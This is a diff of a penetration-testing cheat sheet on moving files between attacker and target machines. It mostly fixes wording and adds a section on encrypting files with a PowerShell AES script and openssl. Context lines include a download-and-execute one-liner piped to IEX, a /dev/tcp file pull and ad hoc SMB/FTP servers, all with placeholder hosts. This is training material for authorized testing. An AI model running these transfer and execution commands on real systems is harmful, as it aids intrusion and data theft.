@@ -75,7 +75,7 @@ Invoke-WebRequest http://<IP>:<PORT>/<FILE> -UseBasicParsing | IEX
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><h4>Default</h4></summary>  
 
-**Source Machine: Create a temporary SMB Share in Linux and place your target file in it** 
+**Source Machine: Create a temporary SMB Share on Linux and place your target file in it** 
 
 ```bash
 mkdir /tmp/smbshare
@@ -100,7 +100,7 @@ net use n: \\<IP>\share /persistent:no
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><h4>Using credentials</h4></summary>  
 
-**Source Machine: Create the SMB Server in Linux**
+**Source Machine: Create the SMB Server on Linux**
 ```bash
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user <USER> -password <PASSWORD>
 ```
@@ -126,7 +126,7 @@ net use n: /delete /y
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><h3>FTP Downloads</h3></summary>  
 
-**Source Machine: Setting up a Python3 FTP Server in Linux**
+**Source Machine: Setting up a Python3 FTP Server on Linux**
 ```bash
 sudo pip3 install pyftpdlib
 sudo python3 -m pyftpdlib --port 21 --user ftpuser --password 'ftppass'
@@ -169,7 +169,7 @@ Get-FileHash "<FILE PATH>" -Algorithm MD5 | select Hash
 ```
 We copy this content and paste it into our attack host, use the base64 command to decode it, and use the md5sum application to confirm the transfer happened correctly.  
 
-**Destination Machine: Decode Base64 String in Linux**
+**Destination Machine: Decode Base64 String on Linux**
 ```bash
 # 1. Save the base64 string to a file
 echo "<BASE64STRING>" > encoded.b64
@@ -184,7 +184,7 @@ md5sum decoded.txt
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><h4>PowerShell Web Uploads</h4></summary>  
 
-**Source Machine: Installing a Configured WebServer with Upload in Linux**
+**Source Machine: Installing a Configured WebServer with Upload on Linux**
 ```bash
 pip3 install uploadserver
 python3 -m uploadserver
@@ -220,13 +220,13 @@ echo <BASE64 FILE> | base64 -d -w 0 > <FILE>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
 <summary><h3>SMB Uploads</h3></summary>  
 
-**Source Machine: Installing WebDav Python modules in Linux**
+**Source Machine: Installing WebDav Python modules on Linux**
 ```bash
 sudo pip3 install wsgidav cheroot
 sudo wsgidav --host=0.0.0.0 --port=<PORT> --root=/tmp --auth=anonymous
 ```
 
-**Destination Machine: Uploading Files using SMB in Windows**
+**Destination Machine: Uploading Files using SMB on Windows**
 ```cmd
 # DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server.
 dir \\192.168.49.128\DavWWWRoot
@@ -240,12 +240,12 @@ If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the s
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><h3>FTP Uploads</h3></summary>
 
-**Source Machine: Start our FTP Server in Linux**
+**Source Machine: Start our FTP Server on Linux**
 ```bash
 sudo python3 -m pyftpdlib --port 21 --write
 ```
 
-**Destination Machine: Upload the file in Windows**
+**Destination Machine: Upload the file on Windows**
 
 Option 1: Upload file using Powershell
 ```cmd
@@ -571,7 +571,7 @@ BinStream.Write(WinHttpReq.ResponseBody);
 BinStream.SaveToFile(WScript.Arguments(1));
 ```  
   
-**Execute the script in Windows (CMD or Powershell)**
+**Execute the script on Windows (CMD or Powershell)**
 ```cmd
 cscript.exe /nologo wget.js http://<IP>:<PORT>/<FILE> <OUTPUT FILE>
 ```    
@@ -595,7 +595,7 @@ with bStrm
 end with
 ```  
   
-**Execute the script in Windows (CMD or Powershell)**
+**Execute the script on Windows (CMD or Powershell)**
 ```cmd
 cscript.exe /nologo wget.vbs http://<IP>:<PORT>/<FILE> <OUTPUT FILE>
 ```    
@@ -691,7 +691,7 @@ cat < /dev/tcp/<IP>/443 > <OUTPUT FILE>
 </details>
 
 &nbsp;&nbsp;&nbsp;&nbsp;<details>
-<summary><h2>RDP</h2></summary>
+<summary><h1>RDP</h1></summary>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><h3>File Transfer via RDP Clipboard</h3></summary>
 
@@ -738,3 +738,172 @@ The shared folder will appear as a drive on the remote Windows session.
 </details>
 </details>
 </details>
+
+---
+
+<details>
+<summary><h1>🔒 Protected File Transfers</h1></summary>
+
+> **Note:** Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data (i.e., credit card numbers), trade secrets, etc., from a client environment. Instead, if attempting to test Data Loss Prevention (DLP) controls/egress filtering protections, create a file with dummy data that mimics the data that the client is trying to protect.
+
+> **Note:** Remember to use a strong and unique password to avoid brute-force cracking attacks should an unauthorized party obtain the file.
+
+&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h2>File Encryption on Windows</h2></summary>
+
+Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the `Invoke-AESEncryption.ps1` PowerShell script. This script is small and provides encryption of files and strings.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>Invoke-AESEncryption.ps1</h3></summary>
+
+```powershell
+function Invoke-AESEncryption {
+    [CmdletBinding()]
+    [OutputType([string])]
+    Param
+    (
+        [Parameter(Mandatory = $true)]
+        [ValidateSet('Encrypt', 'Decrypt')]
+        [String]$Mode,
+
+        [Parameter(Mandatory = $true)]
+        [String]$Key,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+        [String]$Text,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+        [String]$Path
+    )
+
+    Begin {
+        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+        $aesManaged = New-Object System.Security.Cryptography.AesManaged
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.BlockSize = 128
+        $aesManaged.KeySize = 256
+    }
+
+    Process {
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+
+        switch ($Mode) {
+            'Encrypt' {
+                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName + ".aes"
+                }
+
+                $encryptor = $aesManaged.CreateEncryptor()
+                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+                $encryptedBytes = $aesManaged.IV + $encryptedBytes
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File encrypted to $outPath"
+                }
+            }
+
+            'Decrypt' {
+                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName -replace ".aes"
+                }
+
+                $aesManaged.IV = $cipherBytes[0..15]
+                $decryptor = $aesManaged.CreateDecryptor()
+                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File decrypted to $outPath"
+                }
+            }
+        }
+    }
+
+    End {
+        $shaManaged.Dispose()
+        $aesManaged.Dispose()
+    }
+}
+```
+</details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>Import Module Invoke-AESEncryption.ps1</h3></summary>
+
+```powershell
+Import-Module .\Invoke-AESEncryption.ps1 
+```
+
+</details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>File Encryption Examples</h3></summary>
+
+Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
+```powershell
+Invoke-AESEncryption -Mode Encrypt -Key "<PASSWORD>" -Text "<STRING>" 
+```
+
+Decrypts the Base64 encoded string and outputs plain text.
+```powershell
+Invoke-AESEncryption -Mode Decrypt -Key "<PASSWORD>" -Text "<BASE64STRING>" 
+```
+
+Encrypts the file and outputs an encrypted file ".aes".
+```powershell
+Invoke-AESEncryption -Mode Encrypt -Key "<PASSWORD>" -Path <FILE>
+```
+
+Decrypts the ".aes" file and outputs an decrypted file.
+```powershell
+Invoke-AESEncryption -Mode Decrypt -Key "<PASSWORD>" -Path <AES FILE>
+```
+</details>
+</details>
+&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h2>File Encryption on Linux</h2></summary>
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>openssl</h3></summary>
+
+Encrypting file  
+
+```bash
+openssl enc -aes256 -iter 100000 -pbkdf2 -in <FILE> -out <ENCRYPTED FILE>
+```
+
+Decrypting file   
+
+```bash
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <ENCRYPTED FILE> -out <FILE>                    
+```
+
+</details>
+</details>
+</details>
+
+---
